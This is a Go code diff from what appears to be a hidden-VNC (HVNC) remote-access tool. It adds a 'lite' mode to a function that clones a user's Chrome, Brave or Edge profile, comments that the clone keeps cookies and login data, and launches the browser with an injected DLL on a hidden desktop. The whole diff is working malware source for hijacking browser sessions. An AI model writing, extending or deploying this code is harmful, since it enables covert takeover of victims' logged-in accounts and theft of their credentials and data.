@@ -118,7 +118,7 @@ func StartHVNCProcessInjected(filePath string, dllBytes []byte, searchPath, repl
 // If clone is true, it clones the real profile so file I/O is redirected to the clone.
 // If clone is false, it starts the browser with injection but no path redirection.
 // browser should be one of: "chrome", "brave", "edge".
-func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, clone bool) error {
+func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, clone bool, cloneLite bool) error {
 	info, ok := browserInfoMap[strings.ToLower(browser)]
 	if !ok {
 		return fmt.Errorf("unknown browser %q", browser)
@@ -142,7 +142,7 @@ func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, c
 	}
 	log.Printf("hvnc %s: real user data at %s", info.name, realUserData)
 
-	cloneDir, err := cloneBrowserProfile(info.name, realUserData)
+	cloneDir, err := cloneBrowserProfile(info.name, realUserData, cloneLite)
 	if err != nil {
 		return fmt.Errorf("profile clone failed: %v", err)
 	}
@@ -153,7 +153,7 @@ func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, c
 
 // StartHVNCChromeInjected is kept for backward compatibility.
 func StartHVNCChromeInjected(chromePath string, dllBytes []byte) error {
-	return StartHVNCBrowserInjected("chrome", chromePath, dllBytes, true)
+	return StartHVNCBrowserInjected("chrome", chromePath, dllBytes, true, false)
 }
 
 type browserInfo struct {
@@ -225,7 +225,7 @@ func getBrowserUserDataDir(info browserInfo) string {
 // cloneBrowserProfile clones the browser user data directory, skipping only
 // large cache directories that aren't needed for a functional session.
 // This preserves extensions, cookies, login data, local storage, etc.
-func cloneBrowserProfile(browserName string, srcUserData string) (string, error) {
+func cloneBrowserProfile(browserName string, srcUserData string, lite bool) (string, error) {
 	prefix := "hvnc_" + strings.ToLower(browserName) + "_"
 	// Remove any previous cloned profile directories so we always use fresh data
 	tmpDir := os.TempDir()
@@ -256,6 +256,33 @@ func cloneBrowserProfile(browserName string, srcUserData string) (string, error)
 		"optimization_guide_prediction_model_downloads": true,
 		"segmentation_platform":                         true,
 		"commerce_local_db":                             true,
+	}
+
+	if lite {
+		log.Printf("hvnc %s: lite clone — skipping extensions and extra data", browserName)
+		liteSkip := []string{
+			"extensions",
+			"extension state",
+			"extension scripts",
+			"extension rules",
+			"local extension settings",
+			"sync extension settings",
+			"indexeddb",
+			"file system",
+			"session storage",
+			"sessions",
+			"sync data",
+			"web applications",
+			"webrtc internals",
+			"databases",
+			"platform notifications",
+			"gcm store",
+			"storage",
+			"feature_engagement_tracker",
+		}
+		for _, d := range liteSkip {
+			skipDirs[d] = true
+		}
 	}
 
 	entries, err := os.ReadDir(srcUserData)
